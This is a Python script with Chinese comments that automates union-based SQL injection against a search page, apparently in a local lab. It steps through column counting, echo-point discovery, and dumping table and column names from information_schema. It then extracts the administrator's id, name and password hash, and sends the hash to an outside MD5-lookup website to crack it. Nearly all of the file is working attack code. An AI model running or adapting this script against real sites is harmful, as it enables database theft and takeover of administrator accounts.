import requests
import re
url = "http://127.0.0.1:9000/project/search.php"
admintable = ""  # admin表名
pwdcolumn = ""   # admin密码列
password = ""    # admin密码

# 判断字段数
dbLen = 1
while True:
    dbNameLen_url = url + "?search=1' and 1=1 order by "+str(dbLen)+"--+"
    print(dbNameLen_url)

    if "1' and 1=1 order" in requests.get(dbNameLen_url).text:
        if dbLen == 10:
            dbLen = 4
            print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
            print("The len of dbName:"+str(dbLen))
            print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
            break
        else:
            pass
    else:
        dbLen = dbLen-1
        # 输出字段数
        print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
        print("The len of dbName:"+str(dbLen))
        print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
        break
    dbLen += 1

# 查看回显点
dbPoint = "?search=1' union select "
for i in range(1, dbLen+1):
    dbPoint = dbPoint + str(i) 
    if i != dbLen:
        dbPoint = dbPoint + ","
dbPoint = dbPoint + "--+"
dbPoint_url = url + dbPoint
print(dbPoint_url)

check = requests.get(dbPoint_url).text
compile_re = re.compile(r'<td>\d</td>')
res = compile_re.findall(check)
num = []
for i in res:
    tmp = i.split("<td>")[1]
    tmp = tmp.split("</td>")[0]
    num.append(int(tmp))

# 输出回显点
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
print("Echo point:", num)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")

# 爆表名
tabName = "?search=1' and 1=2 union select "
for i in range(1, dbLen+1):
    if i != num[0]:
        tabName = tabName + str(i) 
    else:
        tabName = tabName + "group_concat(table_name)"
    if i != dbLen:
        tabName = tabName + ","
tabName = tabName + " from information_schema.tables where table_schema=database() --+"
tabName_url = url + tabName
print(tabName_url)

check = requests.get(tabName_url).text
compile_re = re.compile(r'<td>.*</td>')
res = compile_re.findall(check)
table = []
for j in res:
    tmp = j.split("</td>")[0]
    tmp = tmp.split("<td>")[1]
    table = table + tmp.split(",")

if "admin" in table:
    admintable = "admin"
else:
    admintable = input()

# 输出表名
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
print("Table name:", table)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")

# 爆列名
colName = "?search=1' and 1=2 union select "
for i in range(1, dbLen+1):
    if i != num[0]:
        colName = colName + str(i) 
    else:
        colName = colName + "group_concat(column_name)"
    
    if i != dbLen:
        colName = colName + ","
colName = colName + " from information_schema.columns where table_name='" + admintable + "' --+"
colName_url = url + colName
print(colName_url)

check = requests.get(colName_url).text
compile_re = re.compile(r'<td>.*</td>')
res = compile_re.findall(check)
column = []
for j in res:
    tmp = j.split("</td>")[0]
    tmp = tmp.split("<td>")[1]
    column = column+tmp.split(",")

if "admin_pass" in column:
    pwdcolumn = "admin_pass"
else:
    pwdcolumn = input()

# 输出列名
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
print("Column name:", column)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")

# 管理员密码
pwdGet = "?search=1' union select "
for i in range(1, dbLen+1):
    if i != num[0]:
        pwdGet = pwdGet + str(i) 
    else:
        pwdGet = pwdGet + "group_concat(admin_id,0x3a,admin_name,0x3a,admin_pass)"
    if i != dbLen:
        pwdGet = pwdGet + ","
pwdGet = pwdGet + " from project." + admintable + "--+"
pwdGet_url = url + pwdGet
print(pwdGet_url)

check = requests.get(pwdGet_url).text
compile_re = re.compile(r':.*</td>')
res = compile_re.findall(check)
password=""
for k in res:
    tmp=k.split(":")[2]
    tmp=tmp.split("</td>")[0]
    password=tmp

# 输出管理员密码(md5)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
print("Admin password(md5):" + password)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")

# 对密码进行md5解码
decode = "http://www.lzltool.com/Encrypt/DecodeMd5?code="+password
resp = requests.get(decode).text
resp = resp.split('"Data":"')[1]
pwd = resp.split('"')[0]
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
print("Admin password:" + pwd)
print("- - - - - - - - - - - - - - - - - - - - - - - - - - ")
